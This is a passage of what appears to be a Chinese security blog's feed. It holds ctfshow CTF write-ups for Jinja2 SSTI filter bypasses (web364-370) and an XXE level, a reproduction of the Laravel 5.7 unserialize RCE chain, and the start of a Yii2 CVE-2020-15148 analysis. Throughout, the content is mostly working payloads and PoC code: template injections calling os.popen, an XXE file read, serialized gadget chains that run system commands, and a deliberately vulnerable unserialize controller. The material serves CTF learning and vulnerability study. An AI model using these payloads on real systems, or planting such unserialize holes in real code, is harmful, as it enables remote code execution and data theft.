a=os;b=popen;c=ls</code></pre><p>还可以用chr()函数绕过</p><p><strong>中括号实际上影响我们的只有从数组中取值，例如__bases__()[1]，而后续的中括号实际是不必要的，globals[“os”]可以替换为globals.os</strong></p><p>所以首先fuzz一下chr()函数在哪：</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[§0§].__init__.__globals__.__builtins__.chr&#125;&#125;</code></pre><img src="/2023/07/25/SSTI%E6%B3%A8%E5%85%A5(ctfshow)/163654.png" class=""><p>可以看到爆出了很多，随便选一个</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[227].__init__.__globals__.__builtins__.chr&#125;&#125;</code></pre><p>接着尝试使用chr尝试绕过后续所有的引号：</p><pre><code>&#123;%set+chr=[].__class__.__bases__[0].__subclasses__()[227].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[chr(111)%2bchr(115)][chr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)](chr(108)%2bchr(115)).read()&#125;&#125;</code></pre><h3 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h3><p>过滤了中括号，但过滤了中括号实际上影响我们的只有从数组中取值，而从数组中取值可以使用pop&#x2F;<strong>getitem</strong>等数组自带方法。不过还是建议用<strong>getitem</strong>，因为pop会破坏数组的结构。</p><p>a[0]与a.<strong>getitem</strong>(0)的效果是一样的，所以上述payload可以用此来绕过：</p><pre><code>?name=&#123;&#123;&#123;&#125;.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(132).__init__.__globals__.popen(request.cookies.a).read()&#125;&#125;</code></pre><p>这里也尝试用一下字符串拼接，写个python脚本跑出来：</p><pre><code>import requestsurl=&quot;http://24d7f73c-6e64-4d9c-95a7-abe78558771a.chall.ctf.show:8080/?name=&#123;&#123;config.__str__().__getitem__(%d)&#125;&#125;&quot;payload=&quot;cat /flag&quot;result=&quot;&quot;for j in payload:    for i in range(0,1000):        r=requests.get(url=url%(i))        location=r.text.find(&quot;&lt;h3&gt;&quot;)        word=r.text[location+4:location+5]        if word==j:            print(&quot;config.__str__().__getitem__(%d)  ==  %s&quot;%(i,j))            result+=&quot;config.__str__().__getitem__(%d)~&quot;%(i)            breakprint(result[:len(result)-1])</code></pre><pre><code>?name=&#123;&#123;url_for.__globals__.os.popen(config.__str__().__getitem__(22)~config.__str__().__getitem__(40)~config.__str__().__getitem__(23)~config.__str__().__getitem__(7)~config.__str__().__getitem__(279)~config.__str__().__getitem__(4)~config.__str__().__getitem__(41)~config.__str__().__getitem__(40)~config.__str__().__getitem__(6)).read()&#125;&#125;</code></pre><p>注：<code>__getitem__()</code>也可以用<code>get()</code>来代替</p><h3 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h3><p>在之前的基础上又ban了<code>_</code>,用url_for.(request.cookies.a)的话会500，这关就用flask自带的过滤器attr</p><p>参考<a href="https://docs.jinkan.org/docs/jinja2/templates.html#id36">https://docs.jinkan.org/docs/jinja2/templates.html#id36</a></p><p>例如foo|attr(“bar”)的意思就是foo[“bar”]</p><p>payload</p><pre><code>?name=&#123;&#123;(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).eval(request.cookies.x5)&#125;&#125;Cookie传参：x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__(&#39;os&#39;).popen(&#39;cat /f*&#39;).read()</code></pre><p>or</p><pre><code>?name=&#123;&#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125;&#125;传参：a=__globals__;b=cat /f*</code></pre><h3 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h3><p>过滤了os</p><p>payload</p><pre><code>?name=&#123;&#123;(lipsum|attr(request.cookies.a)|attr(request.cookies.b))(request.cookies.c).popen(request.cookies.d).read()&#125;&#125;a=__globals__;b=__getitem__;c=os;d=cat /f*</code></pre><h3 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h3><pre><code>ban了&#123;\&#123;，就要想办法拿&#123;% %&#125;来绕过。把上一题的改一下就能直接用了：</code></pre><pre><code>?name=&#123;%print((lipsum|attr(request.cookies.a)|attr(request.cookies.b))(request.cookies.c).popen(request.cookies.d).read())%&#125;a=__globals__;b=__getitem__;c=os;d=cat /f*</code></pre><h3 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h3><p>ban了request，就想办法自己凑字符了，这里拿config来凑。但是一个问题是_被ban了，所以__str__()用不了，这里拿string过滤器来得到config的字符串：config|string，但是获得字符串后本来应该用中括号或者__getitem__()，但是问题是_被ban了，所以获取字符串中的某个字符比较困难，这里转换成列表，再用列表的pop方法就可以成功得到某个字符了，在跑字符的时候发现没有小写的b，只有大写的B，所以再去一层.lower()方法，方便跑更多字符，写个脚本：</p><pre><code>import requestsurl=&quot;http://8db9791d-549f-4151-a095-6bfbce54ba2b.challenge.ctf.show/?name=&#123;&#123;% print (config|string|list).pop(&#123;&#125;).lower() %&#125;&#125;&quot;payload=&quot;cat /flag&quot;raws=&quot;&quot;for i in payload:    for j in range(0,1000):        result=requests.get(url=url.format(j))        location=result.text.find(&quot;&lt;h3&gt;&quot;)        ak=result.text[location+4:location+5]        if(ak==i):            print(&quot;(config|string|list).pop(&#123;&#125;).lower==&#123;&#125;&quot;.format(j,i))            raws+=&quot;(config|string|list).pop(&#123;&#125;).lower()~&quot;.format(j)            breakprint(raws)</code></pre><p>最终payload</p><pre><code>?name=&#123;% print ((lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read()) %&#125;</code></pre><p>还有一种yu师傅的姿势</p><pre><code>http://de1d82f0-b40d-430f-9cb5-ce2435f44306.chall.ctf.show:8080/?name=&#123;% set a=(()|select|string|list).pop(24) %&#125;&#123;% set globals=(a,a,dict(globals=1)|join,a,a)|join %&#125;&#123;% set init=(a,a,dict(init=1)|join,a,a)|join %&#125;&#123;% set builtins=(a,a,dict(builtins=1)|join,a,a)|join %&#125;&#123;% set a=(lipsum|attr(globals)).get(builtins) %&#125;&#123;% set chr=a.chr %&#125;&#123;% print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %&#125;</code></pre><p>这是新的拼接字符的方式，例如:</p><pre><code>&#123;% set a=dict(o=oo,s=ss)|join %&#125;</code></pre><p>这样得到的a就是把这个字典的键名拼接后的值，即os</p><h3 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h3><p>ban了数字，可以把一些东西转string再转list，然后用index，然后基本上所有数字都可以拿到</p><pre><code>&#123;% set o=(dict(o=z)|join) %&#125;&#123;% set n=dict(n=z)|join %&#125;&#123;% set f=dict(f=z)|join %&#125;&#123;% set ershisi=(()|select|string|list).index(o)*(()|select|string|list).index(n) %&#125;&#123;% set liushisi=(()|select|string|list).index(o)*(()|select|string|list).index(o) %&#125;&#123;% set qi=(config|string|list).index(n)%2B(config|string|list).index(f)%&#125;&#123;% set xiegang=(config|string|list).pop(-liushisi) %&#125;&#123;% set gang=(()|select|string|list).pop(ershisi) %&#125;&#123;% set kongge=(config|string|list).pop(qi)%&#125;&#123;% set globals=(gang,gang,(dict(globals=z)|join),gang,gang)|join %&#125;&#123;% set builtins=(gang,gang,(dict(builtins=z)|join),gang,gang)|join %&#125;&#123;% set gangfulaige=(dict(cat=d)|join,kongge,xiegang,dict(flag=z)|join)|join %&#125;&#123;% set ha=dict(o=x,s=k)|join%&#125;&#123;% print (lipsum|attr(globals)).get(ha).popen(gangfulaige).read() %&#125;</code></pre><p>yu师傅的姿势，可以用length很方便的得到数字：</p><pre><code>&#123;% set one=(dict(c=z)|join|length) %&#125;&#123;% set two=(dict(cc=z)|join|length) %&#125;</code></pre><p>还有一种用过滤器int得到数字的方式：</p><pre><code>&#123;% set ten=(dict(aaaaaaaaaa=a)|join|count)%&#125;&#123;% set two=(dict(aa=a)|join|count)%&#125;&#123;% set twofour=( two~four)|int%&#125;&#123;% set a=(()|select|string|list).pop(twofour)%&#125;&#123;% set chr=a.chr%&#125;&#123;% print a.open(chr((four~seven)|int)~chr((ten~two)|int)~chr((ten~eight)|int)~chr((nine~seven)|int)~chr((ten~three)|int)).read()%&#125;</code></pre><h3 id="web371-372"><a href="#web371-372" class="headerlink" title="**web371~372"></a>**web371~372</h3>]]></content>
      
      
      
        <tags>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxe(ctfshow)</title>
      <link href="/2023/07/07/xxe(ctfshow)/"/>
      <url>/2023/07/07/xxe(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h3 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h3><pre><code>// 允许加载外部实体 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 ( ; )libxml_disable_entity_loader(false);// xml文件来源于数据流$xmlfile = file_get_contents(&#39;php://input&#39;);if(isset($xmlfile))&#123;    $dom = new DOMDocument();      // 加载xml实体，参数为替代实体、加载外部子集    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);      // 把 DOM 节点转换为 SimpleXMLElement 对象    $creds = simplexml_import_dom($dom);      // 节点嵌套    $ctfshow = $creds-&gt;ctfshow;    echo $ctfshow;&#125;</code></pre><p>burpsuite发包，不能用hackbar</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE payload [&lt;!ELEMENT payload ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;flag&gt;&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;&lt;/flag&gt;</code></pre><img src="/2023/07/07/xxe(ctfshow)/213422.png" class=""><h3 id="web374-378"><a href="#web374-378" class="headerlink" title="web374~378"></a>web374~378</h3>]]></content>
      
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>laravel5.7反序列化漏洞复现</title>
      <link href="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>和yii一样，Laravel也是一套简洁、优雅的PHPWeb开发框架（PHP Web Framework）。</p><h2 id="环境部署："><a href="#环境部署：" class="headerlink" title="环境部署："></a>环境部署：</h2><p>下载源码：</p><pre><code>https://github.com/laravel/laravel/tree/5.7</code></pre><p>然后就是构造一个反序列化的利用点了，在routes&#x2F;web.php里面加一条路由：</p><pre><code>Route::get(&#39;/unserialize&#39;,&quot;UnserializeController@uns&quot;);  //类名@方法名</code></pre><p>在App\Http\Controllers下面写一个控制器UnserializeController.php文件：</p><pre><code>&lt;?phpnamespace App\Http\Controllers;class UnserializeController extends Controller&#123;    public function uns()&#123;        if(isset($_GET[&#39;c&#39;]))&#123;            unserialize($_GET[&#39;c&#39;]);        &#125;else&#123;            highlight_file(__FILE__);        &#125;        return &quot;uns&quot;;    &#125;&#125;</code></pre><h2 id="反序列化链分析："><a href="#反序列化链分析：" class="headerlink" title="反序列化链分析："></a>反序列化链分析：</h2><p>漏洞链的起点在vendor\laravel\framework\src\Illuminate\Foundation\Testing\PendingCommand.php，与5.6相比，5.7多了一个<code>PendingCommand.php</code>文件。</p><p>看一下这个新增的类，发现有一个<code>__destruct()</code></p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/170946.png" class=""><p><code>$this-&gt;hasExecuted</code>默认是false的，所以可以直接进入run方法：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/171403.png" class=""><p>要想执行到异常处理代码<code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code>中得先经过 $this-&gt;mockConsoleOutput()：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/173138.png" class=""><p>一堆看不懂的代码，来个poc试试：</p><pre><code>&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public function __construct()&#123;            $this-&gt;command=&quot;system&quot;;            $this-&gt;parameters[]=&quot;dir&quot;;        &#125;    &#125;&#125;namespace&#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;</code></pre><p>生成payload，然后传值过去：</p><pre><code>http://127.0.0.1/laravel-5.7/public/index.php/unserialize?c=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7D</code></pre><p>报错了：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/204918.png" class=""><p>打一下断点，发现是mockConsoleOutput()方法中的createABufferedOutputMock()函数：</p><pre><code>foreach ($this-&gt;test-&gt;expectedOutput as $i =&gt; $output) &#123;</code></pre><p>报错的原因就是因为<code>$this-&gt;test</code>没有expectedOutput这个属性。跟进一下这个属性，发现这个属性在<code>trait InteractsWithConsole</code>中，trait类我们没法实例化，此外就只有一些测试类有这个属性，因此这里就卡住了。这时候想到利用__get方法</p><p>大师傅们经过寻找，选择了Illuminate\Auth\GenericUser类：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/155543.png" class=""><p>在这里对类的加载有个疑问，后来在一篇文章中找到了：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/100933.png" class=""><p><code>attributes</code>是可控的，因此直接构造即可。<br>而且，会发现<code>mockConsoleOutput()</code>方法中也有类似的代码：</p><pre><code>foreach ($this-&gt;test-&gt;expectedQuestions as $i =&gt; $question) &#123;</code></pre><p>因此构造：</p><pre><code>&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        public function __construct()&#123;            $this-&gt;command=&quot;system&quot;;            $this-&gt;parameters[]=&quot;dir&quot;;            $this-&gt;test=new GenericUser();        &#125;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()&#123;            $this-&gt;attributes[&#39;expectedOutput&#39;]=[&#39;hello&#39;,&#39;world&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]=[&#39;hello&#39;,&#39;world&#39;];        &#125;    &#125;&#125;namespace&#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;</code></pre><p>还是报错：</p><pre><code>“Call to a member function bind() on null”</code></pre><p>意思是在null上调用成员函数bind()</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/084006.png" class=""><p>原因应该是没有构造$this-&gt;app，看一下app:</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/084501.png" class=""><p>继续构造：</p><pre><code>&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    use Illuminate\Foundation\Application;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        protected $app;        public function __construct()&#123;            $this-&gt;command=&quot;system&quot;;            $this-&gt;parameters[]=&quot;dir&quot;;            $this-&gt;test=new GenericUser();            $this-&gt;app=new Application();        &#125;    &#125;&#125;namespace Illuminate\Foundation&#123;    class Application&#123;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()&#123;            $this-&gt;attributes[&#39;expectedOutput&#39;]=[&#39;hello&#39;,&#39;world&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]=[&#39;hello&#39;,&#39;world&#39;];        &#125;    &#125;&#125;namespace&#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;</code></pre><p>继续报错：</p><pre><code>Target [Illuminate\Contracts\Console\Kernel] is not instantiable</code></pre><p>此时就到了这条链上最困难的点：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/101803.png" class=""><p><code>Kernel::class</code>是完全限定名称，返回的是一个类的完整的带上命名空间的类名，在laravel这里是<code>Illuminate\Contracts\Console\Kernel</code>。</p><p>打断点跟进：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/102333.png" class=""><p>跟进到父类的make()：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/102557.png" class=""><p>跟进到resolve()：</p><pre><code>protected function resolve($abstract, $parameters = [])    &#123;        $abstract = $this-&gt;getAlias($abstract);        $needsContextualBuild = ! empty($parameters) || ! is_null(            $this-&gt;getContextualConcrete($abstract)        );        if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123;            return $this-&gt;instances[$abstract];        &#125;        $this-&gt;with[] = $parameters;        $concrete = $this-&gt;getConcrete($abstract);        if ($this-&gt;isBuildable($concrete, $abstract)) &#123;            $object = $this-&gt;build($concrete);        &#125; else &#123;            $object = $this-&gt;make($concrete);        &#125;        foreach ($this-&gt;getExtenders($abstract) as $extender) &#123;            $object = $extender($object, $this);        &#125;        if ($this-&gt;isShared($abstract) &amp;&amp; ! $needsContextualBuild) &#123;            $this-&gt;instances[$abstract] = $object;        &#125;        $this-&gt;fireResolvingCallbacks($abstract, $object);        $this-&gt;resolved[$abstract] = true;        array_pop($this-&gt;with);        return $object;    &#125;</code></pre><p>可以看到最终会返回一个object，我们是要调用这个object的call方法来执行命令，全局查找一下，这个执行命令的call方法到底在哪个类：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/103803.png" class=""><p>发现在container类里，而构造的app的类是Application类，这个类正好也是container类的子类，所以最终返回这个Application的实例就可以了。</p><p>再来看一下resolve()方法的代码：</p><p>$concrete &#x3D; $this-&gt;getConcrete($abstract);</p><pre><code>    protected function getConcrete($abstract)    &#123;        if (! is_null($concrete = $this-&gt;getContextualConcrete($abstract))) &#123;            return $concrete;        &#125;        // If we don&#39;t have a registered resolver or concrete for the type, we&#39;ll just        // assume each type is a concrete name and will attempt to resolve it as is        // since the container should be able to resolve concretes automatically.        if (isset($this-&gt;bindings[$abstract])) &#123;            return $this-&gt;bindings[$abstract][&#39;concrete&#39;];        &#125;        return $abstract;    &#125;</code></pre><p>第一个if成立不了，主要看第二个if，因为bindings是container的属性，而这里的$this其实就是我们传的app，app的类正好是container的子类，所以bindings的属性同样可控，因此getConcrete()函数的返回值是我们可控的。</p><p><code>getConcrete()</code>函数之后是这个：</p><pre><code>    if ($this-&gt;isBuildable($concrete, $abstract)) &#123;        $object = $this-&gt;build($concrete);    &#125; else &#123;        $object = $this-&gt;make($concrete);    &#125;protected function isBuildable($concrete, $abstract)&#123;    return $concrete === $abstract || $concrete instanceof Closure;&#125;</code></pre><p>这里的$concrete是我们可控的，而$abstract是Illuminate\Contracts\Console\Kernel。经过打断点测试，$this-&gt;build($concrete)得到的结果基本就是最终这个get the value of offset返回的了，因此要想办法让$concrete是Illuminate\Foundation\Application，先来看一下大佬们的poc:</p><pre><code>&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    use Illuminate\Foundation\Application;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        protected $app;        public function __construct()&#123;            $this-&gt;command=&quot;system&quot;;            $this-&gt;parameters[]=&quot;dir&quot;;            $this-&gt;test=new GenericUser();            $this-&gt;app=new Application();        &#125;    &#125;&#125;namespace Illuminate\Foundation&#123;    class Application&#123;        protected $bindings = [];        public function __construct()&#123;            $this-&gt;bindings=array(                &#39;Illuminate\Contracts\Console\Kernel&#39;=&gt;array(                    &#39;concrete&#39;=&gt;&#39;Illuminate\Foundation\Application&#39;                )            );        &#125;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()&#123;            $this-&gt;attributes[&#39;expectedOutput&#39;]=[&#39;hello&#39;,&#39;world&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]=[&#39;hello&#39;,&#39;world&#39;];        &#125;    &#125;&#125;namespace&#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;</code></pre><p>这样到了</p><pre><code>    if ($this-&gt;isBuildable($concrete, $abstract)) &#123;        $object = $this-&gt;build($concrete);    &#125; else &#123;        $object = $this-&gt;make($concrete);    &#125;</code></pre><p>的时候，$concrete是Illuminate\Foundation\Application，$abstract是Illuminate\Contracts\Console\Kernel，无法isBuildable，还会再进入一次make，不过这次make中的$concrete就是我们构造的了。进入make，然后再进入resolve，再进入getConcrete()方法:</p><pre><code>    if (isset($this-&gt;bindings[$abstract])) &#123;       return $this-&gt;bindings[$abstract][&#39;concrete&#39;];    &#125;    return $abstract;</code></pre><p>不存在$this-&gt;bindings[‘Illuminate\Foundation\Application’]，所以会直接return Illuminate\Foundation\Application，这样$abstract也是Illuminate\Foundation\Application了,最终<code>$this-&gt;app[Kernel::class]</code>返回的就是实例化的<code>Illuminate\Foundation\Application</code>类了。然后开始调用call方法,最终成功执行命令：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/111438.png" class=""><p>参考链接:<a href="https://blog.csdn.net/rfrder/article/details/113826483">https://blog.csdn.net/rfrder/article/details/113826483</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yii2框架反序列化漏洞复现</title>
      <link href="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>Yii Framework是一个基于组件、用于开发大型Web应用的高性能 PHP 框架。Yii提供了今日Web 2.0应用开发所需要的几乎一切功能。Yii是最有效率的PHP框架之一。</p><p>Yii2 2.0.38 之前的版本存在反序列化漏洞，程序在调用unserialize 时，攻击者可通过构造特定的恶意请求执行任意命令，CVE编号是CVE-2020-15148</p><h2 id="环境部署："><a href="#环境部署：" class="headerlink" title="环境部署："></a>环境部署：</h2><p>下载地址：</p><pre><code>https://github.com/yiisoft/yii2/releases/tag/2.0.37//下载yii-basic-app-2.0.37.tgz</code></pre><p> 修改&#x2F;config&#x2F;web.php文件17行cookieValidationKey,值可以为任何</p><p>进入目录，执行php yii serve</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/164228.png" class=""><p>此时就可以进入<a href="http://localhost:8080/">http://localhost:8080/</a></p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/164825.png" class=""><h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><p>漏洞的出发点是在<code>\yii\vendor\yiisoft\yii2\db\BatchQueryResult.php</code>文件中</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/192033.png" class=""><p>但是继续跟进close()，发现没什么利用的方法，但是这里的__dataReader是可控的，那么调用了close的方法，可以通过触发__call方法来进行利用。</p><p>全局搜索一下__call方法，在<code>\vendor\fzaninotto\faker\src\Faker\Generator.php</code>存在合适__call的方法：</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/193357.png" class=""><p>因为close是无参方法，所以__call中的<code>$method</code>是close,<code>attributes</code>为空。继续跟进format方法：</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/193848.png" class=""><p>(<code>call_user_func_array</code>：调用回调函数，并把一个数组参数作为回调函数的参数)</p><p>跟进getFormatter:</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/194251.png" class=""><p>因为$this-&gt;formatters是可控的，因此getFormatter方法的返回值也是我们可控的，因此call_user_func_array($this-&gt;getFormatter($formatter), $arguments);中，回调函数是我们可控的，但是$arguments为空，所以相当于我们现在能干两件事，可以调用yii2中任意的一个无参方法，或者调用原生php的类似phpinfo()这样的无参方法，但是第二种肯定不能RCE，因此还要在yii2中已有的无参方法中进行挖掘（直接搜索含有call_user_function的无参函数）：<br>构造正则：</p><pre><code>call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</code></pre><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/201701.png" class=""><p>其中有两个类中的<code>run</code>方法可用：</p><p><code>yii\rest\CreateAction::run()</code>，<code>$this-&gt;checkAccess, $this-&gt;id</code>两个参数可控</p><p><code>\yii\rest\IndexAction::run()</code>，<code>$this-&gt;checkAccess, $this-&gt;id</code>两个参数可控</p><p>至此梳理一下pop链：</p><pre><code>class BatchQueryResult  -&gt;__destruct()↓↓↓class BatchQueryResult  -&gt;reset()↓↓↓class Generator  -&gt;__call()↓↓↓class Generator  -&gt;format()↓↓↓class Generator  -&gt;getFormatter()↓↓↓class IndexAction  -&gt;run()</code></pre><p>这里可以看一下其他师傅的一张图：</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/202329.png" class=""><p>第一步：new了一个yii\db\BatchQueryResult()类，那么就会调用这个类的__construct()方法</p><p>第二步：这个类的__construct()方法会new一个Faker\Generator()类，就又会调用Faker\Generator()类的__construct()方法，并把这个对象赋值给$_dataReader变量。</p><p>第三步：Faker\Generator()类的__construct()方法会new一个yii\rest\CreateAction()类，然后又调用yii\rest\CreateAction()类的__coustrcut()方法。并调用了run方法（这里用了 call_user_func_array后面会讲到），然后赋值给$this-&gt;formatters[‘close’]。</p><p>第四步：反序列化时，类中变量的值我们是可控的；那么就可以通过yii\rest\CreateAction()类的__construct()方法中修改这些变量，将这些值改成命令，成功RCE。</p><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>这是一个反序列化利用链，所以还需要一个反序列化的入口点</p><p>在controllers目录下创建一个TestController.php:</p><pre><code>&lt;?phpnamespace app\controllers; class TestController extends \yii\web\Controller&#123;    public function actionTest($data)&#123;        return unserialize(base64_decode($data));    